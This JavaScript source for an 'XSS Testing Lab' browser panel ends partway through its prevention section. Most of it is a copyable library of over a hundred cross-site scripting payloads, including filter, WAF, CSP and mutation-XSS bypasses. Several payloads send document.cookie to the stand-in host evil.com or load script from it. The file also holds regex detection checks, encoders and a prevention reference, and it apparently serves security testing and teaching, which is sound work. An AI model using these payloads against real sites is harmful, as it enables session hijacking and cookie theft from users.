import { esc } from '/js/shared.js';

const XL_PAYLOADS = {
  basic: {
    name: 'Basic Script Tags',
    payloads: [
      '<script>alert(1)</script>',
      '<script>alert(String.fromCharCode(88,83,83))</script>',
      '<script>alert(document.domain)</script>',
      '<script>alert(document.cookie)</script>',
      '<script src=//evil.com/x.js></script>',
      '<script>new Image().src="http://evil.com/?c="+document.cookie</script>',
      '<script>fetch("http://evil.com/?c="+document.cookie)</script>',
      '<script>eval(atob("YWxlcnQoMSk="))</script>',
      '<script>window["al"+"ert"](1)</script>',
      '<script>this["alert"](1)</script>',
      '<script>top["al"+"ert"](1)</script>',
      '<script>self["alert"](1)</script>',
    ]
  },
  event: {
    name: 'Event Handlers',
    payloads: [
      '<img src=x onerror=alert(1)>',
      '<img src=x onerror="alert(1)">',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1) autofocus>',
      '<input onblur=alert(1) autofocus><input autofocus>',
      '<marquee onstart=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<video src=x onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
      '<div onmouseover=alert(1)>hover me</div>',
      '<div onmouseenter=alert(1)>enter me</div>',
      '<select onfocus=alert(1) autofocus>',
      '<textarea onfocus=alert(1) autofocus>',
      '<keygen onfocus=alert(1) autofocus>',
      '<body onscroll=alert(1)><br><br>...<br><input autofocus>',
      '<button onclick=alert(1)>click</button>',
      '<object data=javascript:alert(1)>',
      '<isindex action=javascript:alert(1) type=image>',
      '<form><button formaction=javascript:alert(1)>X</button>',
      '<a onmouseover=alert(1)>hover</a>',
    ]
  },
  svg: {
    name: 'SVG-Based XSS',
    payloads: [
      '<svg onload=alert(1)>',
      '<svg/onload=alert(1)>',
      '<svg><script>alert(1)</script></svg>',
      '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
      '<svg><set onbegin=alert(1) attributename=x>',
      '<svg><a><rect width=100 height=100 /><animate attributeName=href values=javascript:alert(1) /></a>',
      '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><image href=x onerror=alert(1) /></svg>#x" />',
      '<svg><foreignObject><body onload=alert(1)></foreignObject></svg>',
      '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc>',
    ]
  },
  img: {
    name: 'IMG Tag XSS',
    payloads: [
      '<img src=x onerror=alert(1)>',
      '<img src=x onerror=alert(1)//',
      '<img src="x" onerror="alert(1)">',
      '<img/src=x onerror=alert(1)>',
      '<img src=x:alert(1) onerror=eval(src)>',
      '<img src=1 onerror=alert(1) />',
      '<img src=javascript:alert(1)>',
      '<image src=x onerror=alert(1)>',
      '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
      '<img src=x onerror="&#x61;lert(1)">',
    ]
  },
  attribute: {
    name: 'Attribute Injection',
    payloads: [
      '" onfocus=alert(1) autofocus="',
      "' onfocus=alert(1) autofocus='",
      '" onmouseover=alert(1) "',
      '" onfocus=alert(1) autofocus x="',
      '"><script>alert(1)</script>',
      "'><script>alert(1)</script>",
      '"><img src=x onerror=alert(1)>',
      '" style="background:url(javascript:alert(1))"',
      '" accesskey="x" onclick="alert(1)" x="',
      'javascript:alert(1)//',
      'data:text/html,<script>alert(1)</script>',
      'javascript:/*--></title></style></textarea></script><svg onload=alert(1)>',
    ]
  },
  template: {
    name: 'Template Literal Injection',
    payloads: [
      '${alert(1)}',
      '${7*7}',
      '{{constructor.constructor("alert(1)")()}}',
      '{{7*7}}',
      '#{7*7}',
      '${String.fromCharCode(88,83,83)}',
      '{{this.constructor.constructor("alert(1)")()}}',
      '${`${alert(1)}`}',
      '<%=7*7%>',
      '{{{7*7}}}',
    ]
  },
  dom: {
    name: 'DOM-Based XSS',
    payloads: [
      '#<img src=x onerror=alert(1)>',
      'javascript:alert(document.domain)',
      'data:text/html,<script>alert(1)</script>',
      '#"><img src=x onerror=alert(1)>',
      'javascript:alert(1)//http://example.com',
      'jaVaScRiPt:alert(1)',
      'java%0ascript:alert(1)',
      'java%09script:alert(1)',
      'java%0dscript:alert(1)',
      '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
      '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
    ]
  },
  polyglot: {
    name: 'Polyglot Payloads',
    payloads: [
      'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
      '"><img src=x onerror=alert(1)>"><svg/onload=alert(1)>',
      '\'>"><img src=x onerror=alert(1)>',
      '"-alert(1)-"',
      "'-alert(1)-'",
      '\\"-alert(1)}//',
      '</script><script>alert(1)</script>',
      '*/alert(1)/*',
      '*/</script><script>alert(1)</script>/*',
      '--><script>alert(1)</script>',
      '<!--<script>alert(1)</script>-->',
    ]
  },
  filter_bypass: {
    name: 'Filter Bypass',
    payloads: [
      '<ScRiPt>alert(1)</ScRiPt>',
      '<scr<script>ipt>alert(1)</scr</script>ipt>',
      '<SCRIPT>alert(1)</SCRIPT>',
      '<scr\\x00ipt>alert(1)</scr\\x00ipt>',
      '<img src=x onerror=\\x61lert(1)>',
      '<a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)>click</a>',
      '<a href=&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)>click</a>',
      '<a href="jav	ascript:alert(1)">click</a>',
      '<a href="jav&#x09;ascript:alert(1)">click</a>',
      '<a href="jav&#x0A;ascript:alert(1)">click</a>',
      '<a href="jav&#x0D;ascript:alert(1)">click</a>',
      '%3Cscript%3Ealert(1)%3C/script%3E',
      '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
      '<svg><script>al&#101;rt(1)</script></svg>',
      '<math><mi>x</mi><annotation-xml encoding="text/html"><img src=x onerror=alert(1)></annotation-xml></math>',
    ]
  },
  waf_bypass: {
    name: 'WAF Bypass',
    payloads: [
      '<svg/onload=alert(1)>',
      '<svg onload=alert(1)//',
      '<img src=x onerror=prompt(1)>',
      '<img src=x onerror=confirm(1)>',
      '<details/open/ontoggle=alert(1)>',
      '<video><source onerror=alert(1)>',
      '<img src=x onerror=alert`1`>',
      '<svg onload=alert&lpar;1&rpar;>',
      '<img src=x onerror=\\u0061lert(1)>',
      '<img src=x onerror=al\\u0065rt(1)>',
      '"><svg onload=&#97lert(1)>',
      '<input type=image src onerror=alert(1)>',
      '<form><math><mtext><form><mglyph><svg><mtext><style><img src onerror=alert(1)>',
      '<x contenteditable onblur=alert(1)>lose focus!',
    ]
  },
  csp_bypass: {
    name: 'CSP Bypass',
    payloads: [
      '<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.js"></script><div ng-app ng-csp>{{$eval.constructor("alert(1)")()}}',
      '<script src="https://cdn.jsdelivr.net/npm/angular@1.6.0/angular.min.js"></script><div ng-app ng-csp>{{constructor.constructor("alert(1)")()}}',
      '<base href=//evil.com/>',
      '<script nonce="random">alert(1)</script>',
      '<meta http-equiv="Content-Security-Policy" content="script-src \'unsafe-inline\'">',
      '<link rel=prefetch href=//evil.com>',
      '<object data="data:text/html,<script>alert(1)</script>">',
      '<script src="/uploads/evil.js"></script>',
    ]
  },
  mxss: {
    name: 'Mutation XSS (mXSS)',
    payloads: [
      '<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>',
      '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
      '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
      '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">',
      '<form><math><mtext><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
      '<math><mtext><table><mglyph><style><![CDATA[</style><img title="]]&gt;&lt;img src=1 onerror=alert(1)&gt;">',
    ]
  },
};

const XL_CONTEXTS = {
  html_body: { name: 'HTML Body', desc: 'Injection into HTML element content', example: '<div>USER_INPUT</div>' },
  attr_double: { name: 'Attribute (Double)', desc: 'Inside double-quoted attribute', example: '<input value="USER_INPUT">' },
  attr_single: { name: 'Attribute (Single)', desc: 'Inside single-quoted attribute', example: "<input value='USER_INPUT'>" },
  js_string: { name: 'JS String', desc: 'Inside JavaScript string literal', example: "var x = 'USER_INPUT';" },
  url_param: { name: 'URL Parameter', desc: 'Inside href or src URL', example: '<a href="https://site.com?q=USER_INPUT">' },
  css_value: { name: 'CSS Value', desc: 'Inside CSS property value', example: '<div style="color: USER_INPUT">' },
};

const XL_CONTEXT_PAYLOADS = {
  html_body: ['basic', 'event', 'svg', 'img', 'polyglot'],
  attr_double: ['attribute', 'event'],
  attr_single: ['attribute', 'event'],
  js_string: ['template', 'dom'],
  url_param: ['dom', 'attribute'],
  css_value: ['filter_bypass'],
};

const XL_PREVENTION = [
  { title: 'HTML Context', desc: 'Encode <, >, &, ", \' before inserting into HTML body.', safe: 'element.textContent = userInput;', bad: 'element.innerHTML = userInput;', lib: 'DOMPurify.sanitize(input)' },
  { title: 'Attribute Context', desc: 'Always quote attributes, encode special chars.', safe: 'el.setAttribute("value", userInput);', bad: 'html += \'<input value="\' + userInput + \'">\';', lib: 'Use framework template binding' },
  { title: 'JavaScript Context', desc: 'Never interpolate untrusted data into scripts.', safe: 'JSON.parse(safeJsonString)', bad: 'eval(userInput)', lib: 'Use data attributes, read via dataset' },
  { title: 'URL Context', desc: 'Validate URL scheme (http/https only), encode parameters.', safe: 'new URL(input); // validate\nurl.searchParams.set("q", input);', bad: 'href = "javascript:" + userInput', lib: 'URL validation + encodeURIComponent()' },
  { title: 'CSS Context', desc: 'Never allow user input in style attributes or CSS expressions.', safe: 'el.style.color = sanitizedColor;', bad: 'el.style = userInput;', lib: 'Whitelist allowed values' },
  { title: 'Content Security Policy', desc: 'Deploy CSP headers to restrict script sources.', safe: "Content-Security-Policy: default-src 'self'; script-src 'self'", bad: "Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval'", lib: 'helmet.js for Express, csp-evaluator for audit' },
  { title: 'HttpOnly Cookies', desc: 'Prevent cookie theft via XSS.', safe: 'Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict', bad: 'Set-Cookie: session=abc', lib: 'Framework cookie options' },
  { title: 'Subresource Integrity', desc: 'Protect against CDN compromise.', safe: '<script src="lib.js" integrity="sha384-..." crossorigin="anonymous">', bad: '<script src="https://cdn.example.com/lib.js">', lib: 'SRI Hash Generator' },
];

function analyzeContext(input, contextKey) {
  const ctx = XL_CONTEXTS[contextKey];
  if (!ctx) return { dangerous: false, reason: 'Unknown context' };
  const lower = input.toLowerCase();
  const results = [];
  if (contextKey === 'html_body') {
    if (/<script/i.test(input)) results.push('Contains <script> tag — direct JS execution');
    if (/<img[^>]+onerror/i.test(input)) results.push('IMG tag with onerror handler');
    if (/<svg[^>]*onload/i.test(input)) results.push('SVG with onload event');
    if (/on\w+\s*=/i.test(input)) results.push('Event handler attribute detected');
    if (/<iframe/i.test(input)) results.push('IFrame injection attempt');
  } else if (contextKey === 'attr_double' || contextKey === 'attr_single') {
    const quote = contextKey === 'attr_double' ? '"' : "'";
    if (input.includes(quote)) results.push(`Contains ${quote} — can break out of attribute`);
    if (/on\w+\s*=/i.test(input)) results.push('Event handler injection after breakout');
    if (/>/.test(input)) results.push('Can close tag and inject new elements');
  } else if (contextKey === 'js_string') {
    if (input.includes("'") || input.includes('"')) results.push('Quote characters can break string');
    if (input.includes('\\')) results.push('Backslash can escape the closing quote');
    if (/\$\{/.test(input)) results.push('Template literal injection');
    if (input.includes('</script>')) results.push('Can close script block');
  } else if (contextKey === 'url_param') {
    if (/^javascript:/i.test(lower)) results.push('javascript: protocol — direct execution');
    if (/^data:/i.test(lower)) results.push('data: protocol — can embed HTML/JS');
    if (input.includes('#')) results.push('Fragment can be used for DOM-based XSS');
  } else if (contextKey === 'css_value') {
    if (/expression\s*\(/i.test(input)) results.push('CSS expression() — IE JS execution');
    if (/url\s*\(/i.test(input)) results.push('url() can load external resources');
    if (/behavior\s*:/i.test(input)) results.push('behavior: can reference HTC files (IE)');
  }
  return { dangerous: results.length > 0, findings: results };
}

function htmlEncode(str) {
  return str.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&#x27;');
}

function htmlDecode(str) {
  const t = document.createElement('textarea');
  t.innerHTML = str;
  return t.value;
}

function urlEncode(str) { return encodeURIComponent(str); }
function urlDecode(str) { try { return decodeURIComponent(str); } catch { return str; } }

function unicodeEscape(str) {
  // Escape every character as \uXXXX (matching the panel's cheat sheet, which
  // documents < -> <, and the sibling encoder in payload-gen.js). Escaping
  // only code points > 127 made this a no-op for typical all-ASCII payloads.
  return str.split('').map(c => `\\u${c.charCodeAt(0).toString(16).padStart(4, '0')}`).join('');
}

function hexEncode(str) {
  return Array.from(new TextEncoder().encode(str)).map(b => `\\x${b.toString(16).padStart(2, '0')}`).join('');
}

function jsEscape(str) {
  return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '\\"').replace(/\n/g, '\\n').replace(/\r/g, '\\r');
}

export function renderXSSLab(container) {
  const id = 'xl-' + Math.random().toString(36).slice(2, 8);

  container.innerHTML = `<style>
.xl-wrap{background:#0a0e14;color:#c8d6e5;font-family:'Segoe UI',system-ui,sans-serif;min-height:100vh;padding:0}
.xl-header{background:linear-gradient(135deg,#0d1117 0%,#1a0a2e 50%,#0d1117 100%);padding:20px 28px;border-bottom:1px solid #ff4444 40}
.xl-header h2{margin:0;font-size:22px;color:#ff4444;letter-spacing:1px;font-weight:700}
.xl-header p{margin:4px 0 0;font-size:13px;color:#8a8a8a}
.xl-tabs{display:flex;gap:0;background:#111820;border-bottom:1px solid #1e2a3a;overflow-x:auto}
.xl-tab{padding:10px 20px;background:none;border:none;color:#6a8a9a;cursor:pointer;font-size:13px;white-space:nowrap;border-bottom:2px solid transparent;transition:all .2s}
.xl-tab:hover{color:#c8d6e5;background:#161e28}
.xl-tab.active{color:#ff4444;border-bottom-color:#ff4444;background:#0f1520}
.xl-body{padding:20px 28px}
.xl-panel{display:none}.xl-panel.active{display:block}
.xl-card{background:#111820;border:1px solid #1e2a3a;border-radius:8px;padding:16px;margin-bottom:14px}
.xl-card h3{margin:0 0 10px;font-size:15px;color:#e2e8f0}
.xl-cat-btn{padding:6px 14px;background:#161e28;border:1px solid #1e2a3a;border-radius:4px;color:#8ab4d0;cursor:pointer;font-size:12px;margin:0 6px 6px 0;transition:all .2s}
.xl-cat-btn:hover,.xl-cat-btn.active{background:#1a0a2e;border-color:#ff4444;color:#ff4444}
.xl-payload{background:#0a0e14;border:1px solid #1e2a3a;border-radius:4px;padding:8px 12px;margin:4px 0;font-family:'JetBrains Mono',monospace;font-size:12px;color:#00ff88;display:flex;align-items:center;justify-content:space-between;word-break:break-all;gap:8px}
.xl-payload:hover{border-color:#ff4444 60}
.xl-copy-btn{padding:3px 10px;background:#1e2a3a;border:1px solid #2a3a4a;border-radius:3px;color:#8ab4d0;cursor:pointer;font-size:11px;white-space:nowrap;flex-shrink:0}
.xl-copy-btn:hover{background:#ff4444;color:#fff;border-color:#ff4444}
.xl-input,.xl-textarea,.xl-select{background:#0d1117;border:1px solid #1e2a3a;border-radius:6px;color:#c8d6e5;padding:8px 12px;font-size:13px;width:100%;box-sizing:border-box;font-family:'JetBrains Mono',monospace}
.xl-textarea{min-height:100px;resize:vertical}
.xl-select{cursor:pointer}
.xl-input:focus,.xl-textarea:focus,.xl-select:focus{outline:none;border-color:#ff4444}
.xl-btn{padding:8px 18px;background:#ff4444;border:none;border-radius:6px;color:#fff;cursor:pointer;font-size:13px;font-weight:600;transition:all .2s}
.xl-btn:hover{background:#ff6666}
.xl-btn.secondary{background:#1e2a3a;color:#c8d6e5}
.xl-btn.secondary:hover{background:#2a3a5a}
.xl-result{background:#0d1117;border:1px solid #1e2a3a;border-radius:6px;padding:14px;margin-top:12px;font-family:'JetBrains Mono',monospace;font-size:12px;color:#c8d6e5}
.xl-danger{color:#ff4444;font-weight:600}
.xl-safe{color:#00ff88;font-weight:600}
.xl-warn{color:#ffd600;font-weight:600}
.xl-finding{padding:6px 10px;margin:4px 0;background:#1a0a0a;border-left:3px solid #ff4444;border-radius:0 4px 4px 0;font-size:12px;color:#ff8888}
.xl-grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}
.xl-context-card{background:#111820;border:1px solid #1e2a3a;border-radius:8px;padding:14px;cursor:pointer;transition:all .2s}
.xl-context-card:hover,.xl-context-card.selected{border-color:#ff4444;background:#1a0a1e}
.xl-context-card h4{margin:0 0 4px;color:#e2e8f0;font-size:14px}
.xl-context-card p{margin:0;font-size:12px;color:#6a8a9a}
.xl-context-card code{display:block;margin-top:8px;background:#0a0e14;padding:6px 10px;border-radius:4px;font-size:11px;color:#00aaff}
.xl-encode-row{display:flex;gap:10px;margin-bottom:10px;align-items:center}
.xl-encode-row label{font-size:13px;color:#8ab4d0;min-width:100px}
.xl-prevention{background:#111820;border:1px solid #1e2a3a;border-radius:8px;padding:16px;margin-bottom:14px}
.xl-prevention h4{margin:0 0 6px;color:#00aaff;font-size:14px}
.xl-prevention p{margin:0 0 10px;font-size:13px;color:#8a8a8a}
.xl-code-block{background:#0a0e14;border:1px solid #1e2a3a;border-radius:4px;padding:10px 14px;font-family:'JetBrains Mono',monospace;font-size:12px;margin:6px 0;overflow-x:auto;white-space:pre-wrap}
.xl-code-block.safe{border-left:3px solid #00ff88;color:#00ff88}
.xl-code-block.bad{border-left:3px solid #ff4444;color:#ff4444}
.xl-code-block.lib{border-left:3px solid #00aaff;color:#00aaff}
.xl-badge{display:inline-block;padding:2px 8px;border-radius:3px;font-size:11px;font-weight:600}
.xl-badge.danger{background:#ff4444 20;color:#ff4444}
.xl-badge.info{background:#00aaff20;color:#00aaff}
.xl-badge.ok{background:#00ff8820;color:#00ff88}
.xl-search{margin-bottom:12px}
.xl-count{font-size:12px;color:#6a8a9a;margin-bottom:10px}
.xl-sb-output{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-top:14px}
.xl-sb-pane{background:#0d1117;border:1px solid #1e2a3a;border-radius:6px;padding:12px}
.xl-sb-pane h4{margin:0 0 8px;font-size:13px;color:#8ab4d0}
.xl-sb-render{padding:10px;background:#0a0e14;border-radius:4px;min-height:40px;font-family:'JetBrains Mono',monospace;font-size:12px;word-break:break-all;color:#c8d6e5}
@media(max-width:900px){.xl-grid,.xl-sb-output{grid-template-columns:1fr}.xl-encode-row{flex-direction:column;align-items:stretch}}
</style>
<div class="xl-wrap" id="${id}">
  <div class="xl-header">
    <h2>XSS Testing Lab</h2>
    <p>Cross-Site Scripting payload library, context analyzer, encoder & prevention reference</p>
  </div>
  <div class="xl-tabs">
    <button class="xl-tab active" data-tab="payloads">Payloads</button>
    <button class="xl-tab" data-tab="sandbox">Sandbox</button>
    <button class="xl-tab" data-tab="context">Context Analyzer</button>
    <button class="xl-tab" data-tab="encoder">Encoder</button>
    <button class="xl-tab" data-tab="prevention">Prevention</button>
  </div>
  <div class="xl-body">
    <div class="xl-panel active" data-panel="payloads"></div>
    <div class="xl-panel" data-panel="sandbox"></div>
    <div class="xl-panel" data-panel="context"></div>
    <div class="xl-panel" data-panel="encoder"></div>
    <div class="xl-panel" data-panel="prevention"></div>
  </div>
</div>`;

  const wrap = document.getElementById(id);
  const tabs = wrap.querySelectorAll('.xl-tab');
  const panels = wrap.querySelectorAll('.xl-panel');

  tabs.forEach(t => t.addEventListener('click', () => {
    tabs.forEach(x => x.classList.remove('active'));
    panels.forEach(x => x.classList.remove('active'));
    t.classList.add('active');
    wrap.querySelector(`[data-panel="${t.dataset.tab}"]`).classList.add('active');
  }));

  renderPayloads();
  renderSandbox();
  renderContextAnalyzer();
  renderEncoder();
  renderPrevention();

  function renderPayloads() {
    const panel = wrap.querySelector('[data-panel="payloads"]');
    let activeCat = 'basic';

    function draw() {
      const cats = Object.entries(XL_PAYLOADS);
      const active = XL_PAYLOADS[activeCat];
      const totalPayloads = cats.reduce((s, [, v]) => s + v.payloads.length, 0);

      panel.innerHTML = `
        <div class="xl-card">
          <h3>Payload Categories <span class="xl-badge info">${totalPayloads} payloads</span></h3>
          <div class="xl-search"><input class="xl-input" placeholder="Search payloads..." id="${id}-psearch"></div>
          <div id="${id}-catbtns">${cats.map(([k, v]) =>
            `<button class="xl-cat-btn ${k === activeCat ? 'active' : ''}" data-cat="${k}">${esc(v.name)} <span class="xl-badge danger">${v.payloads.length}</span></button>`
          ).join('')}</div>
        </div>
        <div class="xl-card">
          <h3>${esc(active.name)}</h3>
          <div class="xl-count" id="${id}-pcount">${active.payloads.length} payloads</div>
          <div id="${id}-plist"></div>
        </div>`;

      const listEl = wrap.querySelector(`#${id}-plist`);
      const countEl = wrap.querySelector(`#${id}-pcount`);

      function renderList(filter) {
        const filtered = filter
          ? active.payloads.filter(p => p.toLowerCase().includes(filter.toLowerCase()))
          : active.payloads;
        countEl.textContent = `${filtered.length} payload${filtered.length !== 1 ? 's' : ''}`;
        listEl.innerHTML = filtered.map((p, i) =>
          `<div class="xl-payload"><code>${esc(p)}</code><button class="xl-copy-btn" data-idx="${i}">Copy</button></div>`
        ).join('');
        listEl.querySelectorAll('.xl-copy-btn').forEach(btn => {
          btn.addEventListener('click', () => {
            const idx = parseInt(btn.dataset.idx);
            navigator.clipboard.writeText(filtered[idx]).then(() => {
              btn.textContent = 'Copied!';
              setTimeout(() => btn.textContent = 'Copy', 1200);
            });
          });
        });
      }

      renderList('');

      wrap.querySelector(`#${id}-psearch`).addEventListener('input', e => renderList(e.target.value));

      wrap.querySelectorAll(`#${id}-catbtns .xl-cat-btn`).forEach(btn => {
        btn.addEventListener('click', () => {
          activeCat = btn.dataset.cat;
          draw();
        });
      });
    }

    draw();
  }

  function renderSandbox() {
    const panel = wrap.querySelector('[data-panel="sandbox"]');
    panel.innerHTML = `
      <div class="xl-card">
        <h3>Interactive Sandbox <span class="xl-badge danger">SAFE MODE</span></h3>
        <p style="font-size:12px;color:#6a8a9a;margin:0 0 12px">Payloads are displayed as text only — nothing is executed. This shows how input appears in different contexts.</p>
        <label style="font-size:13px;color:#8ab4d0;display:block;margin-bottom:6px">Input Payload</label>
        <textarea class="xl-textarea" id="${id}-sb-input" placeholder="Type or paste a payload...">&lt;img src=x onerror=alert(1)&gt;</textarea>
        <div style="margin-top:10px;display:flex;gap:8px;flex-wrap:wrap">
          <button class="xl-btn" id="${id}-sb-analyze">Analyze</button>
          <button class="xl-btn secondary" id="${id}-sb-clear">Clear</button>
        </div>
      </div>
      <div id="${id}-sb-results"></div>`;

    wrap.querySelector(`#${id}-sb-analyze`).addEventListener('click', () => {
      const input = wrap.querySelector(`#${id}-sb-input`).value;
      if (!input.trim()) return;
      const resultsEl = wrap.querySelector(`#${id}-sb-results`);

      const contexts = [
        { key: 'html_body', label: 'HTML Body', render: `<div>${esc(input)}</div>` },
        { key: 'attr_double', label: 'Attribute (Double-Quoted)', render: `<input value="${esc(input)}">` },
        { key: 'attr_single', label: "Attribute (Single-Quoted)", render: `<input value='${esc(input)}'>` },
        { key: 'js_string', label: 'JavaScript String', render: `var x = '${esc(jsEscape(input))}';` },
        { key: 'url_param', label: 'URL Parameter', render: `<a href="https://example.com?q=${esc(urlEncode(input))}">` },
        { key: 'css_value', label: 'CSS Value', render: `<div style="content: '${esc(input)}'">` },
      ];

      resultsEl.innerHTML = `<div class="xl-card"><h3>Context Analysis Results</h3>
        <div class="xl-sb-output">${contexts.map(ctx => {
          const analysis = analyzeContext(input, ctx.key);
          return `<div class="xl-sb-pane">
            <h4>${esc(ctx.label)} ${analysis.dangerous ? '<span class="xl-badge danger">VULNERABLE</span>' : '<span class="xl-badge ok">SAFE</span>'}</h4>
            <div class="xl-sb-render">${esc(ctx.render)}</div>
            ${analysis.findings && analysis.findings.length ? analysis.findings.map(f => `<div class="xl-finding">${esc(f)}</div>`).join('') : '<div style="font-size:12px;color:#00ff88;margin-top:6px">No injection vectors detected in this context</div>'}
          </div>`;
        }).join('')}</div>
      </div>`;
    });

    wrap.querySelector(`#${id}-sb-clear`).addEventListener('click', () => {
      wrap.querySelector(`#${id}-sb-input`).value = '';
      wrap.querySelector(`#${id}-sb-results`).innerHTML = '';
    });
  }

  function renderContextAnalyzer() {
    const panel = wrap.querySelector('[data-panel="context"]');
    let selectedCtx = null;

    function draw() {
      panel.innerHTML = `
        <div class="xl-card">
          <h3>Select Injection Context</h3>
          <p style="font-size:12px;color:#6a8a9a;margin:0 0 12px">Click a context to see relevant payloads and escape techniques</p>
          <div class="xl-grid">${Object.entries(XL_CONTEXTS).map(([k, v]) =>
            `<div class="xl-context-card ${selectedCtx === k ? 'selected' : ''}" data-ctx="${k}">
              <h4>${esc(v.name)}</h4>
              <p>${esc(v.desc)}</p>
              <code>${esc(v.example)}</code>
            </div>`
          ).join('')}</div>
        </div>
        <div id="${id}-ctx-results"></div>`;

      panel.querySelectorAll('.xl-context-card').forEach(card => {
        card.addEventListener('click', () => {
          selectedCtx = card.dataset.ctx;
          draw();
          showContextPayloads(selectedCtx);
        });
      });

      if (selectedCtx) showContextPayloads(selectedCtx);
    }

    function showContextPayloads(ctxKey) {
      const resultsEl = wrap.querySelector(`#${id}-ctx-results`);
      const ctx = XL_CONTEXTS[ctxKey];
      const catKeys = XL_CONTEXT_PAYLOADS[ctxKey] || [];
      const allPayloads = catKeys.flatMap(k => XL_PAYLOADS[k] ? XL_PAYLOADS[k].payloads : []);

      resultsEl.innerHTML = `
        <div class="xl-card">
          <h3>Payloads for ${esc(ctx.name)} Context <span class="xl-badge danger">${allPayloads.length}</span></h3>
          <p style="font-size:12px;color:#6a8a9a;margin:0 0 8px">Relevant categories: ${catKeys.map(k => XL_PAYLOADS[k] ? esc(XL_PAYLOADS[k].name) : '').filter(Boolean).join(', ')}</p>
          ${allPayloads.map((p, i) =>
            `<div class="xl-payload"><code>${esc(p)}</code><button class="xl-copy-btn" data-cidx="${i}">Copy</button></div>`
          ).join('')}
        </div>`;

      resultsEl.querySelectorAll('.xl-copy-btn').forEach(btn => {
        btn.addEventListener('click', () => {
          const idx = parseInt(btn.dataset.cidx);
          navigator.clipboard.writeText(allPayloads[idx]).then(() => {
            btn.textContent = 'Copied!';
            setTimeout(() => btn.textContent = 'Copy', 1200);
          });
        });
      });
    }

    draw();
  }

  function renderEncoder() {
    const panel = wrap.querySelector('[data-panel="encoder"]');
    panel.innerHTML = `
      <div class="xl-card">
        <h3>XSS Encoding / Decoding Tools</h3>
        <label style="font-size:13px;color:#8ab4d0;display:block;margin-bottom:6px">Input</label>
        <textarea class="xl-textarea" id="${id}-enc-input" placeholder="Enter text to encode/decode...">&lt;script&gt;alert(1)&lt;/script&gt;</textarea>
        <div style="margin:12px 0;display:flex;gap:8px;flex-wrap:wrap">
          <button class="xl-btn" data-enc="html-enc">HTML Encode</button>
          <button class="xl-btn" data-enc="html-dec">HTML Decode</button>
          <button class="xl-btn" data-enc="url-enc">URL Encode</button>
          <button class="xl-btn" data-enc="url-dec">URL Decode</button>
          <button class="xl-btn" data-enc="unicode">Unicode Escape</button>
          <button class="xl-btn" data-enc="hex">Hex Encode</button>
          <button class="xl-btn" data-enc="js-esc">JS String Escape</button>
          <button class="xl-btn" data-enc="base64-enc">Base64 Encode</button>
          <button class="xl-btn" data-enc="base64-dec">Base64 Decode</button>
        </div>
      </div>
      <div class="xl-card">
        <h3>Output</h3>
        <div class="xl-result" id="${id}-enc-output" style="min-height:60px">Results will appear here...</div>
        <button class="xl-btn secondary" style="margin-top:10px" id="${id}-enc-copy">Copy Output</button>
      </div>
      <div class="xl-card">
        <h3>Quick Reference: Encoding Cheat Sheet</h3>
        <div class="xl-result">
<strong style="color:#00aaff">HTML Entities:</strong>
&lt;  →  &amp;lt;     &gt;  →  &amp;gt;     &amp;  →  &amp;amp;     "  →  &amp;quot;     '  →  &amp;#x27;

<strong style="color:#00aaff">URL Encoding:</strong>
&lt;  →  %3C     &gt;  →  %3E     "  →  %22     '  →  %27     /  →  %2F     space  →  %20

<strong style="color:#00aaff">Unicode:</strong>
&lt;  →  \\u003c     &gt;  →  \\u003e     /  →  \\u002f

<strong style="color:#00aaff">Hex:</strong>
&lt;  →  \\x3c     &gt;  →  \\x3e     '  →  \\x27     "  →  \\x22
        </div>
      </div>`;

    let lastOutput = '';

    panel.querySelectorAll('[data-enc]').forEach(btn => {
      btn.addEventListener('click', () => {
        const input = wrap.querySelector(`#${id}-enc-input`).value;
        const outEl = wrap.querySelector(`#${id}-enc-output`);
        let result = '';
        switch (btn.dataset.enc) {
          case 'html-enc': result = htmlEncode(input); break;
          case 'html-dec': result = htmlDecode(input); break;
          case 'url-enc': result = urlEncode(input); break;
          case 'url-dec': result = urlDecode(input); break;
          case 'unicode': result = unicodeEscape(input); break;
          case 'hex': result = hexEncode(input); break;
          case 'js-esc': result = jsEscape(input); break;
          case 'base64-enc': try { result = btoa(unescape(encodeURIComponent(input))); } catch { result = '[Encode error]'; } break;
          case 'base64-dec': try { result = decodeURIComponent(escape(atob(input))); } catch { try { result = atob(input); } catch { result = '[Invalid Base64]'; } } break;
        }
        lastOutput = result;
        outEl.textContent = result;
      });
    });

    wrap.querySelector(`#${id}-enc-copy`).addEventListener('click', () => {
      if (lastOutput) navigator.clipboard.writeText(lastOutput).then(() => {
        const btn = wrap.querySelector(`#${id}-enc-copy`);
        btn.textContent = 'Copied!';
        setTimeout(() => btn.textContent = 'Copy Output', 1200);
      });
    });
  }

  function renderPrevention() {
    const panel = wrap.querySelector('[data-panel="prevention"]');
